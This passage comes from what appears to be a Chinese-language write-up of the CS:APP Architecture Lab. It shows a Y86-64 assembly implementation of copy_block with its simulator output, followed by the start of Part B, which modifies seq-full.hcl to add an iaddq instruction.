<span class=normal><a href=#__codelineno-89-8> 8</a></span>
<span class=normal><a href=#__codelineno-89-9> 9</a></span>
<span class=normal><a href=#__codelineno-89-10>10</a></span>
<span class=normal><a href=#__codelineno-89-11>11</a></span>
<span class=normal><a href=#__codelineno-89-12>12</a></span>
<span class=normal><a href=#__codelineno-89-13>13</a></span>
<span class=normal><a href=#__codelineno-89-14>14</a></span>
<span class=normal><a href=#__codelineno-89-15>15</a></span>
<span class=normal><a href=#__codelineno-89-16>16</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-89-1><a id=__codelineno-89-1 name=__codelineno-89-1></a>sim/misc$<span class=w> </span>./yas<span class=w> </span>rsum.ys<span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>./yis<span class=w> </span>rsum.yo
</span><span id=__span-89-2><a id=__codelineno-89-2 name=__codelineno-89-2></a>Stopped<span class=w> </span><span class=k>in</span><span class=w> </span><span class=m>37</span><span class=w> </span>steps<span class=w> </span>at<span class=w> </span><span class=nv>PC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x13.<span class=w>  </span>Status<span class=w> </span><span class=s1>'HLT'</span>,<span class=w> </span>CC<span class=w> </span><span class=nv>Z</span><span class=o>=</span><span class=m>0</span><span class=w> </span><span class=nv>S</span><span class=o>=</span><span class=m>0</span><span class=w> </span><span class=nv>O</span><span class=o>=</span><span class=m>0</span>
</span><span id=__span-89-3><a id=__codelineno-89-3 name=__codelineno-89-3></a>Changes<span class=w> </span>to<span class=w> </span>registers:
</span><span id=__span-89-4><a id=__codelineno-89-4 name=__codelineno-89-4></a>%rax:<span class=w>   </span>0x0000000000000000<span class=w>      </span>0x0000000000000cba
</span><span id=__span-89-5><a id=__codelineno-89-5 name=__codelineno-89-5></a>%rbx:<span class=w>   </span>0x0000000000000000<span class=w>      </span>0x000000000000000a
</span><span id=__span-89-6><a id=__codelineno-89-6 name=__codelineno-89-6></a>%rsp:<span class=w>   </span>0x0000000000000000<span class=w>      </span>0x0000000000000200
</span><span id=__span-89-7><a id=__codelineno-89-7 name=__codelineno-89-7></a>
</span><span id=__span-89-8><a id=__codelineno-89-8 name=__codelineno-89-8></a>Changes<span class=w> </span>to<span class=w> </span>memory:
</span><span id=__span-89-9><a id=__codelineno-89-9 name=__codelineno-89-9></a>0x01c0:<span class=w> </span>0x0000000000000000<span class=w>      </span>0x0000000000000086
</span><span id=__span-89-10><a id=__codelineno-89-10 name=__codelineno-89-10></a>0x01c8:<span class=w> </span>0x0000000000000000<span class=w>      </span>0x0000000000000c00
</span><span id=__span-89-11><a id=__codelineno-89-11 name=__codelineno-89-11></a>0x01d0:<span class=w> </span>0x0000000000000000<span class=w>      </span>0x0000000000000086
</span><span id=__span-89-12><a id=__codelineno-89-12 name=__codelineno-89-12></a>0x01d8:<span class=w> </span>0x0000000000000000<span class=w>      </span>0x00000000000000b0
</span><span id=__span-89-13><a id=__codelineno-89-13 name=__codelineno-89-13></a>0x01e0:<span class=w> </span>0x0000000000000000<span class=w>      </span>0x0000000000000086
</span><span id=__span-89-14><a id=__codelineno-89-14 name=__codelineno-89-14></a>0x01e8:<span class=w> </span>0x0000000000000000<span class=w>      </span>0x000000000000000a
</span><span id=__span-89-15><a id=__codelineno-89-15 name=__codelineno-89-15></a>0x01f0:<span class=w> </span>0x0000000000000000<span class=w>      </span>0x000000000000005b
</span><span id=__span-89-16><a id=__codelineno-89-16 name=__codelineno-89-16></a>0x01f8:<span class=w> </span>0x0000000000000000<span class=w>      </span>0x0000000000000013
</span></code></pre></div></td></tr></table></div> <h4 id=copy_block>copy_block<a class=headerlink href=#copy_block title="Permanent link">¶</a></h4> <p><code>copy_block</code>函数是将内存中的一个块复制到另一个不重叠的区域，并且计算所有复制数组元素的xor校验和Xor，对应的C代码为:</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-90-1> 1</a></span>
<span class=normal><a href=#__codelineno-90-2> 2</a></span>
<span class=normal><a href=#__codelineno-90-3> 3</a></span>
<span class=normal><a href=#__codelineno-90-4> 4</a></span>
<span class=normal><a href=#__codelineno-90-5> 5</a></span>
<span class=normal><a href=#__codelineno-90-6> 6</a></span>
<span class=normal><a href=#__codelineno-90-7> 7</a></span>
<span class=normal><a href=#__codelineno-90-8> 8</a></span>
<span class=normal><a href=#__codelineno-90-9> 9</a></span>
<span class=normal><a href=#__codelineno-90-10>10</a></span>
<span class=normal><a href=#__codelineno-90-11>11</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-90-1><a id=__codelineno-90-1 name=__codelineno-90-1></a><span class=kt>long</span><span class=w> </span><span class=nf>copy_block</span><span class=p>(</span><span class=kt>long</span><span class=w> </span><span class=o>*</span><span class=n>src</span><span class=p>,</span><span class=w> </span><span class=kt>long</span><span class=w> </span><span class=o>*</span><span class=n>dest</span><span class=p>,</span><span class=w> </span><span class=kt>long</span><span class=w> </span><span class=n>len</span><span class=p>)</span>
</span><span id=__span-90-2><a id=__codelineno-90-2 name=__codelineno-90-2></a><span class=p>{</span>
</span><span id=__span-90-3><a id=__codelineno-90-3 name=__codelineno-90-3></a><span class=w>    </span><span class=kt>long</span><span class=w> </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
</span><span id=__span-90-4><a id=__codelineno-90-4 name=__codelineno-90-4></a><span class=w>    </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=n>len</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
</span><span id=__span-90-5><a id=__codelineno-90-5 name=__codelineno-90-5></a><span class=w>        </span><span class=kt>long</span><span class=w> </span><span class=n>val</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>*</span><span class=n>src</span><span class=o>++</span><span class=p>;</span>
</span><span id=__span-90-6><a id=__codelineno-90-6 name=__codelineno-90-6></a><span class=w>        </span><span class=o>*</span><span class=n>dest</span><span class=o>++</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>val</span><span class=p>;</span>
</span><span id=__span-90-7><a id=__codelineno-90-7 name=__codelineno-90-7></a><span class=w>        </span><span class=n>result</span><span class=w> </span><span class=o>^=</span><span class=w> </span><span class=n>val</span><span class=p>;</span>
</span><span id=__span-90-8><a id=__codelineno-90-8 name=__codelineno-90-8></a><span class=w>        </span><span class=n>len</span><span class=o>--</span><span class=p>;</span>
</span><span id=__span-90-9><a id=__codelineno-90-9 name=__codelineno-90-9></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-90-10><a id=__codelineno-90-10 name=__codelineno-90-10></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>result</span><span class=p>;</span>
</span><span id=__span-90-11><a id=__codelineno-90-11 name=__codelineno-90-11></a><span class=p>}</span><span class=w> </span>
</span></code></pre></div></td></tr></table></div> <p>创建 copy.ys 并输入如下内容：</p> <div class="language-asm highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-91-1> 1</a></span>
<span class=normal><a href=#__codelineno-91-2> 2</a></span>
<span class=normal><a href=#__codelineno-91-3> 3</a></span>
<span class=normal><a href=#__codelineno-91-4> 4</a></span>
<span class=normal><a href=#__codelineno-91-5> 5</a></span>
<span class=normal><a href=#__codelineno-91-6> 6</a></span>
<span class=normal><a href=#__codelineno-91-7> 7</a></span>
<span class=normal><a href=#__codelineno-91-8> 8</a></span>
<span class=normal><a href=#__codelineno-91-9> 9</a></span>
<span class=normal><a href=#__codelineno-91-10>10</a></span>
<span class=normal><a href=#__codelineno-91-11>11</a></span>
<span class=normal><a href=#__codelineno-91-12>12</a></span>
<span class=normal><a href=#__codelineno-91-13>13</a></span>
<span class=normal><a href=#__codelineno-91-14>14</a></span>
<span class=normal><a href=#__codelineno-91-15>15</a></span>
<span class=normal><a href=#__codelineno-91-16>16</a></span>
<span class=normal><a href=#__codelineno-91-17>17</a></span>
<span class=normal><a href=#__codelineno-91-18>18</a></span>
<span class=normal><a href=#__codelineno-91-19>19</a></span>
<span class=normal><a href=#__codelineno-91-20>20</a></span>
<span class=normal><a href=#__codelineno-91-21>21</a></span>
<span class=normal><a href=#__codelineno-91-22>22</a></span>
<span class=normal><a href=#__codelineno-91-23>23</a></span>
<span class=normal><a href=#__codelineno-91-24>24</a></span>
<span class=normal><a href=#__codelineno-91-25>25</a></span>
<span class=normal><a href=#__codelineno-91-26>26</a></span>
<span class=normal><a href=#__codelineno-91-27>27</a></span>
<span class=normal><a href=#__codelineno-91-28>28</a></span>
<span class=normal><a href=#__codelineno-91-29>29</a></span>
<span class=normal><a href=#__codelineno-91-30>30</a></span>
<span class=normal><a href=#__codelineno-91-31>31</a></span>
<span class=normal><a href=#__codelineno-91-32>32</a></span>
<span class=normal><a href=#__codelineno-91-33>33</a></span>
<span class=normal><a href=#__codelineno-91-34>34</a></span>
<span class=normal><a href=#__codelineno-91-35>35</a></span>
<span class=normal><a href=#__codelineno-91-36>36</a></span>
<span class=normal><a href=#__codelineno-91-37>37</a></span>
<span class=normal><a href=#__codelineno-91-38>38</a></span>
<span class=normal><a href=#__codelineno-91-39>39</a></span>
<span class=normal><a href=#__codelineno-91-40>40</a></span>
<span class=normal><a href=#__codelineno-91-41>41</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-91-1><a id=__codelineno-91-1 name=__codelineno-91-1></a><span class=w>    </span><span class=na>.pos</span><span class=w> </span><span class=mi>0</span><span class=w>                  </span><span class=c1># Execution begins at address 0</span>
</span><span id=__span-91-2><a id=__codelineno-91-2 name=__codelineno-91-2></a><span class=w>    </span><span class=nf>irmovq</span><span class=w> </span><span class=no>stack</span><span class=p>,</span><span class=w> </span><span class=nv>%rsp</span><span class=w>      </span><span class=c1># Set up stack pointer</span>
</span><span id=__span-91-3><a id=__codelineno-91-3 name=__codelineno-91-3></a><span class=w>    </span><span class=nf>call</span><span class=w> </span><span class=no>main</span><span class=w>               </span><span class=c1># Execute main program</span>
</span><span id=__span-91-4><a id=__codelineno-91-4 name=__codelineno-91-4></a><span class=w>    </span><span class=nf>halt</span><span class=w>                    </span><span class=c1># Terminate program</span>
</span><span id=__span-91-5><a id=__codelineno-91-5 name=__codelineno-91-5></a>
</span><span id=__span-91-6><a id=__codelineno-91-6 name=__codelineno-91-6></a><span class=w>    </span><span class=na>.align</span><span class=w> </span><span class=mi>8</span><span class=w>                </span><span class=c1># Sample source and destination blocks, aligned to 8-byte boundary</span>
</span><span id=__span-91-7><a id=__codelineno-91-7 name=__codelineno-91-7></a><span class=nl>src:</span>
</span><span id=__span-91-8><a id=__codelineno-91-8 name=__codelineno-91-8></a><span class=w>    </span><span class=na>.quad</span><span class=w> </span><span class=mi>0x00a</span>
</span><span id=__span-91-9><a id=__codelineno-91-9 name=__codelineno-91-9></a><span class=w>    </span><span class=na>.quad</span><span class=w> </span><span class=mi>0x0b0</span>
</span><span id=__span-91-10><a id=__codelineno-91-10 name=__codelineno-91-10></a><span class=w>    </span><span class=na>.quad</span><span class=w> </span><span class=mi>0xc00</span>
</span><span id=__span-91-11><a id=__codelineno-91-11 name=__codelineno-91-11></a><span class=nl>dest:</span>
</span><span id=__span-91-12><a id=__codelineno-91-12 name=__codelineno-91-12></a><span class=w>    </span><span class=na>.quad</span><span class=w> </span><span class=mi>0x111</span>
</span><span id=__span-91-13><a id=__codelineno-91-13 name=__codelineno-91-13></a><span class=w>    </span><span class=na>.quad</span><span class=w> </span><span class=mi>0x222</span>
</span><span id=__span-91-14><a id=__codelineno-91-14 name=__codelineno-91-14></a><span class=w>    </span><span class=na>.quad</span><span class=w> </span><span class=mi>0x333</span>
</span><span id=__span-91-15><a id=__codelineno-91-15 name=__codelineno-91-15></a>
</span><span id=__span-91-16><a id=__codelineno-91-16 name=__codelineno-91-16></a><span class=nl>main:</span>
</span><span id=__span-91-17><a id=__codelineno-91-17 name=__codelineno-91-17></a><span class=w>    </span><span class=nf>irmovq</span><span class=w> </span><span class=no>src</span><span class=p>,</span><span class=w> </span><span class=nv>%rdi</span><span class=w>        </span><span class=c1># src, src in %rdi</span>
</span><span id=__span-91-18><a id=__codelineno-91-18 name=__codelineno-91-18></a><span class=w>    </span><span class=nf>irmovq</span><span class=w> </span><span class=no>dest</span><span class=p>,</span><span class=w> </span><span class=nv>%rsi</span><span class=w>       </span><span class=c1># dest, dest in %rsi</span>
</span><span id=__span-91-19><a id=__codelineno-91-19 name=__codelineno-91-19></a><span class=w>    </span><span class=nf>irmovq</span><span class=w> </span><span class=no>$3</span><span class=p>,</span><span class=w> </span><span class=nv>%rdx</span><span class=w>         </span><span class=c1># len, len in %rdx</span>
</span><span id=__span-91-20><a id=__codelineno-91-20 name=__codelineno-91-20></a><span class=w>    </span><span class=nf>call</span><span class=w> </span><span class=no>copy_block</span>
</span><span id=__span-91-21><a id=__codelineno-91-21 name=__codelineno-91-21></a><span class=w>    </span><span class=nf>ret</span>
</span><span id=__span-91-22><a id=__codelineno-91-22 name=__codelineno-91-22></a>
</span><span id=__span-91-23><a id=__codelineno-91-23 name=__codelineno-91-23></a><span class=nl>copy_block:</span><span class=w>                </span><span class=c1># long copy_block(long *src, long *dest, long len)</span>
</span><span id=__span-91-24><a id=__codelineno-91-24 name=__codelineno-91-24></a><span class=w>    </span><span class=nf>irmovq</span><span class=w> </span><span class=no>$8</span><span class=p>,</span><span class=w> </span><span class=nv>%r8</span>
</span><span id=__span-91-25><a id=__codelineno-91-25 name=__codelineno-91-25></a><span class=w>    </span><span class=nf>irmovq</span><span class=w> </span><span class=no>$1</span><span class=p>,</span><span class=w> </span><span class=nv>%r9</span>
</span><span id=__span-91-26><a id=__codelineno-91-26 name=__codelineno-91-26></a><span class=w>    </span><span class=nf>irmovq</span><span class=w> </span><span class=no>$0</span><span class=p>,</span><span class=w> </span><span class=nv>%rax</span>
</span><span id=__span-91-27><a id=__codelineno-91-27 name=__codelineno-91-27></a><span class=w>    </span><span class=nf>andq</span><span class=w> </span><span class=nv>%rdx</span><span class=p>,</span><span class=w> </span><span class=nv>%rdx</span>
</span><span id=__span-91-28><a id=__codelineno-91-28 name=__codelineno-91-28></a><span class=w>    </span><span class=nf>jmp</span><span class=w> </span><span class=no>test</span>
</span><span id=__span-91-29><a id=__codelineno-91-29 name=__codelineno-91-29></a><span class=nl>loop:</span>
</span><span id=__span-91-30><a id=__codelineno-91-30 name=__codelineno-91-30></a><span class=w>    </span><span class=nf>mrmovq</span><span class=w> </span><span class=p>(</span><span class=nv>%rdi</span><span class=p>),</span><span class=w> </span><span class=nv>%r10</span><span class=w>     </span><span class=c1># val = *src1</span>
</span><span id=__span-91-31><a id=__codelineno-91-31 name=__codelineno-91-31></a><span class=w>    </span><span class=nf>addq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=w> </span><span class=nv>%rdi</span><span class=w>          </span><span class=c1># src++</span>
</span><span id=__span-91-32><a id=__codelineno-91-32 name=__codelineno-91-32></a><span class=w>    </span><span class=nf>rmmovq</span><span class=w> </span><span class=nv>%r10</span><span class=p>,</span><span class=w> </span><span class=p>(</span><span class=nv>%rsi</span><span class=p>)</span><span class=w>     </span><span class=c1># *dest = val</span>
</span><span id=__span-91-33><a id=__codelineno-91-33 name=__codelineno-91-33></a><span class=w>    </span><span class=nf>addq</span><span class=w> </span><span class=nv>%r8</span><span class=p>,</span><span class=w> </span><span class=nv>%rsi</span><span class=w>          </span><span class=c1># dest++</span>
</span><span id=__span-91-34><a id=__codelineno-91-34 name=__codelineno-91-34></a><span class=w>    </span><span class=nf>xorq</span><span class=w> </span><span class=nv>%r10</span><span class=p>,</span><span class=w> </span><span class=nv>%rax</span><span class=w>         </span><span class=c1># result ^= val</span>
</span><span id=__span-91-35><a id=__codelineno-91-35 name=__codelineno-91-35></a><span class=w>    </span><span class=nf>subq</span><span class=w> </span><span class=nv>%r9</span><span class=p>,</span><span class=w> </span><span class=nv>%rdx</span><span class=w>          </span><span class=c1># len--.  Set CC</span>
</span><span id=__span-91-36><a id=__codelineno-91-36 name=__codelineno-91-36></a><span class=nl>test:</span>
</span><span id=__span-91-37><a id=__codelineno-91-37 name=__codelineno-91-37></a><span class=w>    </span><span class=nf>jne</span><span class=w> </span><span class=no>loop</span><span class=w>                </span><span class=c1># Stop when 0</span>
</span><span id=__span-91-38><a id=__codelineno-91-38 name=__codelineno-91-38></a><span class=w>    </span><span class=nf>ret</span>
</span><span id=__span-91-39><a id=__codelineno-91-39 name=__codelineno-91-39></a>
</span><span id=__span-91-40><a id=__codelineno-91-40 name=__codelineno-91-40></a><span class=w>    </span><span class=na>.pos</span><span class=w> </span><span class=mi>0x200</span><span class=w>              </span><span class=c1># Stack starts here and grows to lower addresses</span>
</span><span id=__span-91-41><a id=__codelineno-91-41 name=__codelineno-91-41></a><span class=nl>stack:</span>
</span></code></pre></div></td></tr></table></div> <p>结果：</p> <div class="language-bash highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-92-1> 1</a></span>
<span class=normal><a href=#__codelineno-92-2> 2</a></span>
<span class=normal><a href=#__codelineno-92-3> 3</a></span>
<span class=normal><a href=#__codelineno-92-4> 4</a></span>
<span class=normal><a href=#__codelineno-92-5> 5</a></span>
<span class=normal><a href=#__codelineno-92-6> 6</a></span>
<span class=normal><a href=#__codelineno-92-7> 7</a></span>
<span class=normal><a href=#__codelineno-92-8> 8</a></span>
<span class=normal><a href=#__codelineno-92-9> 9</a></span>
<span class=normal><a href=#__codelineno-92-10>10</a></span>
<span class=normal><a href=#__codelineno-92-11>11</a></span>
<span class=normal><a href=#__codelineno-92-12>12</a></span>
<span class=normal><a href=#__codelineno-92-13>13</a></span>
<span class=normal><a href=#__codelineno-92-14>14</a></span>
<span class=normal><a href=#__codelineno-92-15>15</a></span>
<span class=normal><a href=#__codelineno-92-16>16</a></span>
<span class=normal><a href=#__codelineno-92-17>17</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-92-1><a id=__codelineno-92-1 name=__codelineno-92-1></a>sim/misc$<span class=w> </span>./yas<span class=w> </span>copy.ys<span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span>./yis<span class=w> </span>copy.yo
</span><span id=__span-92-2><a id=__codelineno-92-2 name=__codelineno-92-2></a>Stopped<span class=w> </span><span class=k>in</span><span class=w> </span><span class=m>36</span><span class=w> </span>steps<span class=w> </span>at<span class=w> </span><span class=nv>PC</span><span class=w> </span><span class=o>=</span><span class=w> </span>0x13.<span class=w>  </span>Status<span class=w> </span><span class=s1>'HLT'</span>,<span class=w> </span>CC<span class=w> </span><span class=nv>Z</span><span class=o>=</span><span class=m>1</span><span class=w> </span><span class=nv>S</span><span class=o>=</span><span class=m>0</span><span class=w> </span><span class=nv>O</span><span class=o>=</span><span class=m>0</span>
</span><span id=__span-92-3><a id=__codelineno-92-3 name=__codelineno-92-3></a>Changes<span class=w> </span>to<span class=w> </span>registers:
</span><span id=__span-92-4><a id=__codelineno-92-4 name=__codelineno-92-4></a>%rax:<span class=w>   </span>0x0000000000000000<span class=w>      </span>0x0000000000000cba
</span><span id=__span-92-5><a id=__codelineno-92-5 name=__codelineno-92-5></a>%rsp:<span class=w>   </span>0x0000000000000000<span class=w>      </span>0x0000000000000200
</span><span id=__span-92-6><a id=__codelineno-92-6 name=__codelineno-92-6></a>%rsi:<span class=w>   </span>0x0000000000000000<span class=w>      </span>0x0000000000000048
</span><span id=__span-92-7><a id=__codelineno-92-7 name=__codelineno-92-7></a>%rdi:<span class=w>   </span>0x0000000000000000<span class=w>      </span>0x0000000000000030
</span><span id=__span-92-8><a id=__codelineno-92-8 name=__codelineno-92-8></a>%r8:<span class=w>    </span>0x0000000000000000<span class=w>      </span>0x0000000000000008
</span><span id=__span-92-9><a id=__codelineno-92-9 name=__codelineno-92-9></a>%r9:<span class=w>    </span>0x0000000000000000<span class=w>      </span>0x0000000000000001
</span><span id=__span-92-10><a id=__codelineno-92-10 name=__codelineno-92-10></a>%r10:<span class=w>   </span>0x0000000000000000<span class=w>      </span>0x0000000000000c00
</span><span id=__span-92-11><a id=__codelineno-92-11 name=__codelineno-92-11></a>
</span><span id=__span-92-12><a id=__codelineno-92-12 name=__codelineno-92-12></a>Changes<span class=w> </span>to<span class=w> </span>memory:
</span><span id=__span-92-13><a id=__codelineno-92-13 name=__codelineno-92-13></a>0x0030:<span class=w> </span>0x0000000000000111<span class=w>      </span>0x000000000000000a
</span><span id=__span-92-14><a id=__codelineno-92-14 name=__codelineno-92-14></a>0x0038:<span class=w> </span>0x0000000000000222<span class=w>      </span>0x00000000000000b0
</span><span id=__span-92-15><a id=__codelineno-92-15 name=__codelineno-92-15></a>0x0040:<span class=w> </span>0x0000000000000333<span class=w>      </span>0x0000000000000c00
</span><span id=__span-92-16><a id=__codelineno-92-16 name=__codelineno-92-16></a>0x01f0:<span class=w> </span>0x0000000000000000<span class=w>      </span>0x000000000000006f
</span><span id=__span-92-17><a id=__codelineno-92-17 name=__codelineno-92-17></a>0x01f8:<span class=w> </span>0x0000000000000000<span class=w>      </span>0x0000000000000013
</span></code></pre></div></td></tr></table></div> </li> <li> <h3 id=part-b>Part B<a class=headerlink href=#part-b title="Permanent link">¶</a></h3> <p>该部分在<code>sim/seq</code>文件夹中，想要我们对SEQ处理器进行扩展，使其支持<code>iaddq</code>指令，主要是修改<code>seq-full.hcl</code>文件：</p> <div class="language-asm highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-93-1> 1</a></span>
<span class=normal><a href=#__codelineno-93-2> 2</a></span>
<span class=normal><a href=#__codelineno-93-3> 3</a></span>
<span class=normal><a href=#__codelineno-93-4> 4</a></span>
<span class=normal><a href=#__codelineno-93-5> 5</a></span>
<span class=normal><a href=#__codelineno-93-6> 6</a></span>
<span class=normal><a href=#__codelineno-93-7> 7</a></span>
<span class=normal><a href=#__codelineno-93-8> 8</a></span>
<span class=normal><a href=#__codelineno-93-9> 9</a></span>
<span class=normal><a href=#__codelineno-93-10>10</a></span>
<span class=normal><a href=#__codelineno-93-11>11</a></span>
<span class=normal><a href=#__codelineno-93-12>12</a></span>
<span class=normal><a href=#__codelineno-93-13>13</a></span>
<span class=normal><a href=#__codelineno-93-14>14</a></span>
<span class=normal><a href=#__codelineno-93-15>15</a></span>
<span class=normal><a href=#__codelineno-93-16>16</a></span>
<span class=normal><a href=#__codelineno-93-17>17</a></span>
<span class=normal><a href=#__codelineno-93-18>18</a></span>
<span class=normal><a href=#__codelineno-93-19>19</a></span>
<span class=normal><a href=#__codelineno-93-20>20</a></span>
<span class=normal><a href=#__codelineno-93-21>21</a></span>
<span class=normal><a href=#__codelineno-93-22>22</a></span>
<span class=normal><a href=#__codelineno-93-23>23</a></span>
<span class=normal><a href=#__codelineno-93-24>24</a></span>
<span class=normal><a href=#__codelineno-93-25>25</a></span>
<span class=normal><a href=#__codelineno-93-26>26</a></span>
<span class=normal><a href=#__codelineno-93-27>27</a></span>
<span class=normal><a href=#__codelineno-93-28>28</a></span>
<span class=normal><a href=#__codelineno-93-29>29</a></span>
<span class=normal><a href=#__codelineno-93-30>30</a></span>
<span class=normal><a href=#__codelineno-93-31>31</a></span>
<span class=normal><a href=#__codelineno-93-32>32</a></span>
<span class=normal><a href=#__codelineno-93-33>33</a></span>
<span class=normal><a href=#__codelineno-93-34>34</a></span>
<span class=normal><a href=#__codelineno-93-35>35</a></span>
<span class=normal><a href=#__codelineno-93-36>36</a></span>
<span class=normal><a href=#__codelineno-93-37>37</a></span>
<span class=normal><a href=#__codelineno-93-38>38</a></span>
<span class=normal><a href=#__codelineno-93-39>39</a></span>
<span class=normal><a href=#__codelineno-93-40>40</a></span>
<span class=normal><a href=#__codelineno-93-41>41</a></span>
<span class=normal><a href=#__codelineno-93-42>42</a></span>
<span class=normal><a href=#__codelineno-93-43>43</a></span>
<span class=normal><a href=#__codelineno-93-44>44</a></span>
<span class=normal><a href=#__codelineno-93-45>45</a></span>
<span class=normal><a href=#__codelineno-93-46>46</a></span>
<span class=normal><a href=#__codelineno-93-47>47</a></span>
<span class=normal><a href=#__codelineno-93-48>48</a></span>
<span class=normal><a href=#__codelineno-93-49>49</a></span>
<span class=normal><a href=#__codelineno-93-50>50</a></span>
<span class=normal><a href=#__codelineno-93-51>51</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-93-1><a id=__codelineno-93-1 name=__codelineno-93-1></a><span class=nf>bool</span><span class=w> </span><span class=no>instr_valid</span><span class=w> </span><span class=err>=</span><span class=w> </span><span class=no>icode</span><span class=w> </span><span class=no>in</span><span class=w> </span>
</span><span id=__span-93-2><a id=__codelineno-93-2 name=__codelineno-93-2></a><span class=p>{</span><span class=w> </span><span class=no>INOP</span><span class=p>,</span><span class=w> </span><span class=no>IHALT</span><span class=p>,</span><span class=w> </span><span class=no>IRRMOVQ</span><span class=p>,</span><span class=w> </span><span class=no>IIRMOVQ</span><span class=p>,</span><span class=w> </span><span class=no>IRMMOVQ</span><span class=p>,</span><span class=w> </span><span class=no>IMRMOVQ</span><span class=p>,</span>
</span><span id=__span-93-3><a id=__codelineno-93-3 name=__codelineno-93-3></a><span class=w>       </span><span class=nf>IOPQ</span><span class=p>,</span><span class=w> </span><span class=no>IJXX</span><span class=p>,</span><span class=w> </span><span class=no>ICALL</span><span class=p>,</span><span class=w> </span><span class=no>IRET</span><span class=p>,</span><span class=w> </span><span class=no>IPUSHQ</span><span class=p>,</span><span class=w> </span><span class=no>IPOPQ</span><span class=p>,</span><span class=w> </span><span class=no>IIADDQ</span><span class=w> </span><span class=p>}</span><span class=c1>; # Add IIADDQ, 取指阶段, 该信号判断是否为合法指令</span>
</span><span id=__span-93-4><a id=__codelineno-93-4 name=__codelineno-93-4></a>
</span><span id=__span-93-5><a id=__codelineno-93-5 name=__codelineno-93-5></a><span class=c1># Does fetched instruction require a regid byte?</span>
</span><span id=__span-93-6><a id=__codelineno-93-6 name=__codelineno-93-6></a><span class=nf>bool</span><span class=w> </span><span class=no>need_regids</span><span class=w> </span><span class=err>=</span>
</span><span id=__span-93-7><a id=__codelineno-93-7 name=__codelineno-93-7></a><span class=w>    </span><span class=nf>icode</span><span class=w> </span><span class=no>in</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=no>IRRMOVQ</span><span class=p>,</span><span class=w> </span><span class=no>IOPQ</span><span class=p>,</span><span class=w> </span><span class=no>IPUSHQ</span><span class=p>,</span><span class=w> </span><span class=no>IPOPQ</span><span class=p>,</span><span class=w> </span>
</span><span id=__span-93-8><a id=__codelineno-93-8 name=__codelineno-93-8></a><span class=w>            </span><span class=no>IIRMOVQ</span><span class=p>,</span><span class=w> </span><span class=no>IRMMOVQ</span><span class=p>,</span><span class=w> </span><span class=no>IMRMOVQ</span><span class=p>,</span><span class=w> </span><span class=no>IIADDQ</span><span class=w> </span><span class=p>}</span><span class=c1>;         # Add IIADDQ, iaddq指令需要读取寄存器rB</span>
</span><span id=__span-93-9><a id=__codelineno-93-9 name=__codelineno-93-9></a>
</span><span id=__span-93-10><a id=__codelineno-93-10 name=__codelineno-93-10></a><span class=c1># Does fetched instruction require a constant word?</span>
</span><span id=__span-93-11><a id=__codelineno-93-11 name=__codelineno-93-11></a><span class=nf>bool</span><span class=w> </span><span class=no>need_valC</span><span class=w> </span><span class=err>=</span>
</span><span id=__span-93-12><a id=__codelineno-93-12 name=__codelineno-93-12></a><span class=w>    </span><span class=nf>icode</span><span class=w> </span><span class=no>in</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=no>IIRMOVQ</span><span class=p>,</span><span class=w> </span><span class=no>IRMMOVQ</span><span class=p>,</span><span class=w> </span><span class=no>IMRMOVQ</span><span class=p>,</span><span class=w> </span><span class=no>IJXX</span><span class=p>,</span><span class=w> </span><span class=no>ICALL</span><span class=p>,</span><span class=w> </span><span class=no>IIADDQ</span><span class=w> </span><span class=p>}</span><span class=c1>; # Add IIADDQ, iaddq指令还需要立即数</span>
</span><span id=__span-93-13><a id=__codelineno-93-13 name=__codelineno-93-13></a>
</span><span id=__span-93-14><a id=__codelineno-93-14 name=__codelineno-93-14></a><span class=c1>################ Decode Stage    ###################################</span>
</span><span id=__span-93-15><a id=__codelineno-93-15 name=__codelineno-93-15></a>
</span><span id=__span-93-16><a id=__codelineno-93-16 name=__codelineno-93-16></a><span class=c1>## What register should be used as the B source?</span>
</span><span id=__span-93-17><a id=__codelineno-93-17 name=__codelineno-93-17></a><span class=nf>word</span><span class=w> </span><span class=no>srcB</span><span class=w> </span><span class=err>=</span><span class=w> </span><span class=p>[</span>
</span><span id=__span-93-18><a id=__codelineno-93-18 name=__codelineno-93-18></a><span class=w>    </span><span class=nf>icode</span><span class=w> </span><span class=no>in</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=no>IOPQ</span><span class=p>,</span><span class=w> </span><span class=no>IRMMOVQ</span><span class=p>,</span><span class=w> </span><span class=no>IMRMOVQ</span><span class=p>,</span><span class=w> </span><span class=no>IIADDQ</span><span class=w> </span><span class=p>}</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=no>rB</span><span class=c1>;    # Add IIADDQ, 因为iaddq要使用rB寄存器，所以需要设置srcB的源为rB</span>
